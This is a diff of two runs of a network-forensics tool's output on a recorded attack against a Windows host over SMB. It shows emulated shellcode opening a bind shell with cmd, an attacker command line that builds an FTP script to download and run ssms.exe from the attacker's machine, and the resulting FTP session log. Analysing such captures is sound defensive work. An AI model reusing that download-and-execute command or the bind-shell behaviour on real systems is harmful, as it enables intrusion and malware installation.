@@ -1,58 +1,60 @@
 Processing
 (('98.114.205.102', 1821), ('192.150.11.111', 445)) Start 1970-01-01 00:00:00 Stop 1970-01-01 00:00:00 Duration NaN C2S 0 (application/x-empty) S2C 0 (application/x-empty)
+application/x-empty -> empty -> /tmp/file8YJwJZ
+application/x-empty -> empty -> /tmp/fileDU4HP4
 (('98.114.205.102', 1828), ('192.150.11.111', 445)) Start 2009-04-20 03:28:28.642319 Stop 2009-04-20 03:28:30.509185 Duration 1.86686611176 C2S 4209 (application/octet-stream) S2C 902 (application/octet-stream)
-application/octet-stream -> data -> /tmp/filep1f00v
+application/octet-stream -> data -> /tmp/fileW650zB
 [+] Shellcode found
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e92a8 => 
+     HMODULE = 0x0965d098 => 
          none;
-     LPCSTR = 0x094e9308 => 
+     LPCSTR = 0x0965d0f8 => 
            = "CreateProcessA";
 ) =  0x7c802367;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9450 => 
+     HMODULE = 0x0965d240 => 
          none;
-     LPCSTR = 0x094e94b0 => 
+     LPCSTR = 0x0965d2a0 => 
            = "ExitThread";
 ) =  0x7c80c058;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9600 => 
+     HMODULE = 0x0965d3f0 => 
          none;
-     LPCSTR = 0x094e9660 => 
+     LPCSTR = 0x0965d450 => 
            = "LoadLibraryA";
 ) =  0x7c801d77;
 HMODULE LoadLibraryA (
-     LPCTSTR = 0x094e97a8 => 
+     LPCTSTR = 0x0965d598 => 
            = "ws2_32";
 ) =  0x71a10000;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e98e8 => 
+     HMODULE = 0x0965d6d8 => 
          none;
-     LPCSTR = 0x094e9948 => 
+     LPCSTR = 0x0965d738 => 
            = "WSASocketA";
 ) =  0x71a18769;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9a90 => 
+     HMODULE = 0x0965d880 => 
          none;
-     LPCSTR = 0x094e9af0 => 
+     LPCSTR = 0x0965d8e0 => 
            = "bind";
 ) =  0x71a13e00;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9c38 => 
+     HMODULE = 0x0965da28 => 
          none;
-     LPCSTR = 0x094e9c98 => 
+     LPCSTR = 0x0965da88 => 
            = "listen";
 ) =  0x71a188d3;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9de0 => 
+     HMODULE = 0x0965dbd0 => 
          none;
-     LPCSTR = 0x094e9e40 => 
+     LPCSTR = 0x0965dc30 => 
            = "accept";
 ) =  0x71a21028;
 FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x094e9f88 => 
+     HMODULE = 0x0965dd78 => 
          none;
-     LPCSTR = 0x094e9fe8 => 
+     LPCSTR = 0x0965ddd8 => 
            = "closesocket";
 ) =  0x71a19639;
 SOCKET WSASocket (
@@ -85,23 +87,23 @@ SOCKET accept (
      struct sockaddr * addr = 0x00000000 => 
          struct   = {
          };
-     int = 0x094ea800 => 
+     int = 0x0965e5f0 => 
          none;
 ) =  0x44;
 BOOL CreateProcess (
-     LPCWSTR = 0x094ea9b0 => 
+     LPCWSTR = 0x0965e7a0 => 
            = "g";
-     LPCWSTR = 0x094eaa48 => 
+     LPCWSTR = 0x0965e838 => 
            = "cmd";
-     LPSECURITY_ATTRIBUTES = 0x094eaad8 => 
+     LPSECURITY_ATTRIBUTES = 0x0965e8c8 => 
          none;
-     LPSECURITY_ATTRIBUTES = 0x094eab48 => 
+     LPSECURITY_ATTRIBUTES = 0x0965e938 => 
          none;
      BOOL fInheritHandles = 1;
      DWORD fdwCreate = 0;
-     LPVOID = 0x094eac40 => 
+     LPVOID = 0x0965ea30 => 
          none;
-     LPWSTR = 0x094eaca8 => 
+     LPWSTR = 0x0965ea98 => 
          none;
      struct LPSTARTUPINFOW psiStartInfo = 0x0012fe54 => 
          struct   = {
@@ -142,7 +144,7 @@ void ExitThread (
      DWORD dwExitCode = 0;
 ) =  0x0;
 
-application/octet-stream -> data -> /tmp/fileyOPxby
+application/octet-stream -> data -> /tmp/filelM0HrV
 (('98.114.205.102', 1924), ('192.150.11.111', 1957)) Start 2009-04-20 03:28:31.701948 Stop 2009-04-20 03:28:33.317950 Duration 1.61600208282 C2S 133 (text/plain) S2C 2 (text/plain)
 ##### INTERLEAVED #####
 
@@ -151,184 +153,10 @@ echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit
 ssms.exe
 
 
+text/plain -> ASCII text, with CRLF line terminators -> /tmp/fileWzM4E2
+text/plain -> ASCII text -> /tmp/fileYRHZkS
 (('98.114.205.102', 2152), ('192.150.11.111', 1080)) Start 2009-04-20 03:28:34.648099 Stop 2009-04-20 03:28:44.415405 Duration 9.7673060894 C2S 158720 (application/x-dosexec) S2C 0 (application/x-empty)
-(('192.150.11.111', 36296), ('98.114.205.102', 8884)) Start 2009-04-20 03:28:33.723988 Stop 2009-04-20 03:28:44.591557 Duration 10.8675689697 C2S 77 (text/plain) S2C 214 (text/plain)
-##### INTERLEAVED #####
-220 NzmxFtpd 0wns j0
-USER 1
-331 Password required
-PASS 1
-230 User logged in.
-SYST
-215 NzmxFtpd
-TYPE I
-200 Type set to I.
-PORT 192,150,11,111,4,56
-200 PORT command successful.
-RETR ssms.exe
-150 Opening BINARY mode data connection
-QUIT
-226 Transfer complete.
-
-Processing
-(('98.114.205.102', 1821), ('192.150.11.111', 445)) Start 1970-01-01 00:00:00 Stop 1970-01-01 00:00:00 Duration NaN C2S 0 (application/x-empty) S2C 0 (application/x-empty)
-application/x-empty -> empty -> /tmp/filexBUR02
-application/x-empty -> empty -> /tmp/filej4Kauu
-(('98.114.205.102', 1828), ('192.150.11.111', 445)) Start 2009-04-20 03:28:28.642319 Stop 2009-04-20 03:28:30.509185 Duration 1.86686611176 C2S 4209 (application/octet-stream) S2C 902 (application/octet-stream)
-application/octet-stream -> data -> /tmp/filekuZsIV
-[+] Shellcode found
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2098 => 
-         none;
-     LPCSTR = 0x09bf20f8 => 
-           = "CreateProcessA";
-) =  0x7c802367;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2240 => 
-         none;
-     LPCSTR = 0x09bf22a0 => 
-           = "ExitThread";
-) =  0x7c80c058;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf23f0 => 
-         none;
-     LPCSTR = 0x09bf2450 => 
-           = "LoadLibraryA";
-) =  0x7c801d77;
-HMODULE LoadLibraryA (
-     LPCTSTR = 0x09bf2598 => 
-           = "ws2_32";
-) =  0x71a10000;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf26d8 => 
-         none;
-     LPCSTR = 0x09bf2738 => 
-           = "WSASocketA";
-) =  0x71a18769;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2880 => 
-         none;
-     LPCSTR = 0x09bf28e0 => 
-           = "bind";
-) =  0x71a13e00;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2a28 => 
-         none;
-     LPCSTR = 0x09bf2a88 => 
-           = "listen";
-) =  0x71a188d3;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2bd0 => 
-         none;
-     LPCSTR = 0x09bf2c30 => 
-           = "accept";
-) =  0x71a21028;
-FARPROC WINAPI GetProcAddress (
-     HMODULE = 0x09bf2d78 => 
-         none;
-     LPCSTR = 0x09bf2dd8 => 
-           = "closesocket";
-) =  0x71a19639;
-SOCKET WSASocket (
-     int af = 2;
-     int type = 1;
-     int protocol = 0;
-     LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
-     GROUP g = 0;
-     DWORD dwFlags = 0;
-) =  0x42;
-int bind (
-     SOCKET s = 66;
-     struct sockaddr_in * name = 0x004175e2 => 
-         struct   = {
-             short sin_family = 2;
-             unsigned short sin_port = 42247 (port=1957);
-             struct in_addr sin_addr = {
-                 unsigned long s_addr = 0 (host=0.0.0.0);
-             };
-             char sin_zero = "       ";
-         };
-     int namelen = 16;
-) =  0x0;
-int listen (
-     SOCKET s = 66;
-     int backlog = 1;
-) =  0x0;
-SOCKET accept (
-     SOCKET s = 66;
-     struct sockaddr * addr = 0x00000000 => 
-         struct   = {
-         };
-     int = 0x09bf35f0 => 
-         none;
-) =  0x44;
-BOOL CreateProcess (
-     LPCWSTR = 0x09bf37a0 => 
-           = "g";
-     LPCWSTR = 0x09bf3838 => 
-           = "cmd";
-     LPSECURITY_ATTRIBUTES = 0x09bf38c8 => 
-         none;
-     LPSECURITY_ATTRIBUTES = 0x09bf3938 => 
-         none;
-     BOOL fInheritHandles = 1;
-     DWORD fdwCreate = 0;
-     LPVOID = 0x09bf3a30 => 
-         none;
-     LPWSTR = 0x09bf3a98 => 
-         none;
-     struct LPSTARTUPINFOW psiStartInfo = 0x0012fe54 => 
-         struct   = {
-             DWORD cb = 0;
-             LPTSTR lpReserved = 0;
-             LPTSTR lpDesktop = 0;
-             LPTSTR lpTitle = 0;
-             DWORD dwX = 0;
-             DWORD dwY = 0;
-             DWORD dwXSize = 0;
-             DWORD dwYSize = 0;
-             DWORD dwXCountChars = 0;
-             DWORD dwYCountChars = 0;
-             DWORD dwFillAttribute = 0;
-             DWORD dwFlags = 0;
-             WORD wShowWindow = 0;
-             WORD cbReserved2 = 0;
-             LPBYTE lpReserved2 = 0;
-             HANDLE hStdInput = 68;
-             HANDLE hStdOutput = 68;
-             HANDLE hStdError = 68;
-         };
-     struct PROCESS_INFORMATION pProcInfo = 0x0052f74c => 
-         struct   = {
-             HANDLE hProcess = 4711;
-             HANDLE hThread = 4712;
-             DWORD dwProcessId = 4712;
-             DWORD dwThreadId = 4714;
-         };
-) =  0xffffffff;
-int closesocket (
-     SOCKET s = 68;
-) =  0x0;
-int closesocket (
-     SOCKET s = 66;
-) =  0x0;
-void ExitThread (
-     DWORD dwExitCode = 0;
-) =  0x0;
-
-application/octet-stream -> data -> /tmp/fileplVrIQ
-(('98.114.205.102', 1924), ('192.150.11.111', 1957)) Start 2009-04-20 03:28:31.701948 Stop 2009-04-20 03:28:33.317950 Duration 1.61600208282 C2S 133 (text/plain) S2C 2 (text/plain)
-##### INTERLEAVED #####
-
-echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
-
-ssms.exe
-
-
-text/plain -> ASCII text, with CRLF line terminators -> /tmp/filemWhfCX
-text/plain -> ASCII text -> /tmp/fileIPvFqw
-(('98.114.205.102', 2152), ('192.150.11.111', 1080)) Start 2009-04-20 03:28:34.648099 Stop 2009-04-20 03:28:44.415405 Duration 9.7673060894 C2S 158720 (application/x-dosexec) S2C 0 (application/x-empty)
-application/x-dosexec -> PE32 executable (GUI) Intel 80386, for MS Windows -> /tmp/file6YoVG1
+application/x-dosexec -> PE32 executable (GUI) Intel 80386, for MS Windows -> /tmp/fileke66Tc
 Optional Header: 0x400000
 Address Of Entry Point: 0x11905c
 Number of Sections 4
@@ -338,7 +166,7 @@ Subsystem: IMAGE_SUBSYSTEM_WINDOWS_GUI
 Compile Time: 1970-01-01 00:00:00
 Number of RVA and Sizes: 16
 Directory Entry Imports: 1
-application/x-empty -> empty -> /tmp/filezCbyFv
+application/x-empty -> empty -> /tmp/filevHzqGG
 (('192.150.11.111', 36296), ('98.114.205.102', 8884)) Start 2009-04-20 03:28:33.723988 Stop 2009-04-20 03:28:44.591557 Duration 10.8675689697 C2S 77 (text/plain) S2C 214 (text/plain)
 ##### INTERLEAVED #####
 220 NzmxFtpd 0wns j0
@@ -357,5 +185,5 @@ RETR ssms.exe
 QUIT
 226 Transfer complete.
 
-text/plain -> ASCII text, with CRLF line terminators -> /tmp/filezWrpcK
-text/plain -> ASCII text -> /tmp/fileSZ6a1Z
+text/plain -> ASCII text, with CRLF line terminators -> /tmp/file9XOPfo
+text/plain -> ASCII text -> /tmp/filedqLQQz
